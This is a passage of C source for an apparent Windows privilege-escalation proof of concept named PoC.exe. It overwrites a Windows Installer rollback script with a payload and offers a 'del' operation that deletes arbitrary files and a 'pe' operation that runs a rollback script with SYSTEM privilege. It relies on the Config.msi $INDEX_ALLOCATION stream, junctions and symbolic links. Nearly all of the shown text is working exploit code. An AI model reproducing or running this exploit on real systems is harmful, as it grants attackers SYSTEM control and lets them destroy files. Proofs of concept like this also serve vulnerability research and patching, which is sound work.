	HANDLE rbs = CreateFile(rbsfile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	// Attempt to overwrite the .rbs file with the payload buffer.
	if (WriteFile(rbs, RbsBuff, RbsSize, NULL, NULL)) {
		// Log successful overwrite of the rollback script.
		printf("[+] Rollback script overwritten with ours!\n");
	}
	else
	{
		// Log failure to overwrite the rollback script.
		printf("[!] Failed to overwrite rbs file!\n");
	}
	// Close handles to the rbs file and the directory after operations.
	CloseHandle(rbs);
	CloseHandle(cfg_h);
	return;
}

// Function displays help information about how to use the program from the command line.
void printHelp() {
	// Outputs the usage instructions for the program to the console.
	// The instructions include how to execute the program with necessary operation arguments.
	printf(
		".\\PoC.exe <operation> <argument>\n" // Shows the basic usage pattern for the executable.
		"<operation> <argument>:\n"           // Introduces the section listing available operations.
		"\tdel <target file path>: delete file\n"  // Explains the 'del' operation to delete a specified file.
		"\tpe <RollbackScript.rbs>: execute rollback script with SYSTEM privilege\n"  // Explains the 'pe' operation to execute a rollback script with elevated privileges.
	);
	// Returns from the function after printing the help message.
	return;
}

int wmain(int argc, wchar_t* argv[])
{
	// Check if the number of arguments is less than 3. If true, it indicates insufficient input has been provided.
	if (argc < 3) {
		printHelp();  // Call the function to display help information about how to use the program.
		return 0;     // Exit the program with a return code of 0, indicating successful execution but no action due to insufficient arguments.
	}

	// Call the load function to initialize necessary resources or configurations.
	load();

	// Check if the first argument after the program name is "del", which is a command to delete a file.
	if (wcscmp(argv[1], L"del") == 0) {
		// Format the target file path for deletion into a system-recognizable path format.
		_swprintf(targetDeleteFile, L"\\??\\%s", argv[2]);
		// Call the function to trigger the deletion process.
		Trigger1();
	}
	// Check if the first argument is "pe", which is a command to execute a rollback script with SYSTEM privileges.
	else if (wcscmp(argv[1], L"pe") == 0) {
		// Format the target file path for executing the rollback script.
		_swprintf(targetDeleteFile, L"%s", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
		// Call the PE function, passing the rollback script and the trigger function.
		PE(argv[2], Trigger1);
	}
	else {
		// If the command is not recognized, display the help information.
		printHelp();
		// Exit the program with a return code of 0, indicating no recognized action was performed.
		return 0;
	}

	// After the main action is performed, clean up by deleting any created junction and symbolic link.
	DeleteJunction(dir);                    // Remove any junction point that may have been created.
	DelDosDeviceSymLink(fullobjectpathFile, targetDeleteFile);  // Remove any symbolic links that may have been created.

	// Return 0 to indicate the program executed successfully.
	return 0;
}
